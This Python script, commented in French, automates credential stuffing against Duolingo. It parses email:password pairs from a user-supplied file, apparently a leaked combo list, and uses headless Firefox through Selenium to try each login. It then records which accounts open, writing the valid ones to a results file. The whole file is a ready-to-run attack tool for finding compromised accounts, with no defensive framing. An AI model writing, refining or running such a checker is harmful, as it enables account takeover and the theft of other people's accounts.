# -*- coding: utf-8 -*-
"""
Checker de comptes Duolingo par Selenium (Firefox)
"""

import re, os, time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def extraire_credentials(ligne):
    m = re.search(r"([\w\.-]+@[\w\.-]+):([^\s|]+)", ligne)
    return f"{m.group(1)}:{m.group(2)}" if m else None

def tester_duolingo(email, motdepasse):
    options = webdriver.FirefoxOptions()
    options.add_argument("--headless")  # mets en commentaire pour voir le navigateur
    driver = webdriver.Firefox(options=options)

    try:
        driver.get("https://fr.duolingo.com/log-in")
        wait = WebDriverWait(driver, 15)

        champ_email = wait.until(EC.presence_of_element_located((By.ID, "web-ui1")))
        champ_mdp = driver.find_element(By.ID, "web-ui2")

        champ_email.send_keys(email)
        champ_mdp.send_keys(motdepasse)
        champ_mdp.send_keys(Keys.RETURN)

        wait.until(EC.url_contains("duolingo.com"))
        time.sleep(3)

        if "learn" in driver.current_url:
            print(f"✅ {email}:{motdepasse} → Connexion réussie")
            return f"{email}:{motdepasse} ✅"
        else:
            print(f"❌ {email}:{motdepasse} → Échec de connexion")
            return f"{email}:{motdepasse} ❌"
    except Exception as e:
        print(f"⚠️ Erreur avec {email}: {e}")
        return f"{email}:{motdepasse} ⚠️ Erreur: {e}"
    finally:
        driver.quit()

# 📂 Demande du fichier à l'utilisateur
fichier = input("🔍 Nom du fichier (ex: comptes.txt) : ").strip()
if not os.path.exists(fichier):
    print("❌ Fichier introuvable."); exit()

# 🧼 Extraction des credentials
with open(fichier, "r", encoding="utf-8") as f:
    lignes = f.readlines()

credentials = [extraire_credentials(l) for l in lignes if ":" in l]
credentials = [c for c in credentials if c]

print(f"\n📋 {len(credentials)} comptes détectés.\nTest de connexion en cours...\n")

# 🔁 Test de chaque compte
resultats = []
for cred in credentials:
    email, password = cred.split(":")
    res = tester_duolingo(email, password)
    resultats.append(res)

# 💾 Sauvegarde des résultats
with open("resultats_duolingo.txt", "w", encoding="utf-8") as f:
    for r in resultats:
        f.write(r + "\n")

print("\n✅ Tous les résultats ont été enregistrés dans 'resultats_duolingo.txt'")
